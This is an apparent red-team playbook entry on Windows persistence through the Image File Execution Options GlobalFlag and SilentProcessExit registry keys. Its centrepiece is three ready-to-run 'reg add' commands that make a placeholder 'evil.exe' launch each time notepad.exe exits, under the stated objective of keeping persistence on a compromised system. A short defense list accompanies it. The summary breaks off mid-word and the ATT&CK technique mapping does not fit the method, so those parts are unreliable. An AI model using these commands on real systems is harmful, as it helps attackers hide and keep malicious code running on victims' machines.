---
id: 6519db60-e033-484a-b170-7c6ab82c1afb
name: Elevated Registry Persistence with GlobalFlag
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:28.052393+00:00'
updated_at: '2023-04-10T20:37:22.812312+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]'
tags:
- '[[Elevated]]'
- '[[GlobalFlag]]'
- '[[Registry HKLM]]'
- '[[Windows - Persistence]]'
commands:
- '[[Add registry keys for notepad.exe]]'
---

# Elevated Registry Persistence with GlobalFlag

## Summary

This technique involves creating a registry key in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Notepad.exe with the GlobalFlag value set to 512. This value enables silent process exit monitoring for Notepad.exe, which allows for the persistence of a malicious proc

## Description

# Description

This technique involves creating a registry key in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Notepad.exe with the GlobalFlag value set to 512. This value enables silent process exit monitoring for Notepad.exe, which allows for the persistence of a malicious process even after the user logs off. This technique is useful for maintaining persistence on a compromised system.

 

## Requirements

1. Elevated privileges

 

## Defense

1. Restrict access to the registry key to prevent unauthorized modification

1. Monitor the registry for changes to this key

1. Use endpoint detection and response (EDR) tools to detect and respond to malicious activity

 

## Objectives

1. Maintain persistence on a compromised system

 

# Instructions

1. To enable silent process exit monitoring for notepad.exe, run the following commands:

 



**Code**: [[reg add "HKLM\SOFTWARE\Microsoft\Windows NT\Curren]]



> These commands will add registry keys to enable silent process exit monitoring for notepad.exe. The first command sets the GlobalFlag value to 512, which enables silent process exit monitoring. The second command sets the ReportingMode value to 1, which enables reporting of silent process exit events. The third command sets the MonitorProcess value to "C:\temp\evil.exe", which specifies the path to the executable that will be launched when a silent process exit event occurs.



**Command** ([[Add registry keys for notepad.exe]]):

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```



## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Registry Run Keys / Startup Folder|T1060 - Registry Run Keys / Startup Folder]]

## Commands Used

- [[Add registry keys for notepad.exe]]

## Tags

- [[Elevated]]
- [[GlobalFlag]]
- [[Registry HKLM]]
- [[Windows - Persistence]]


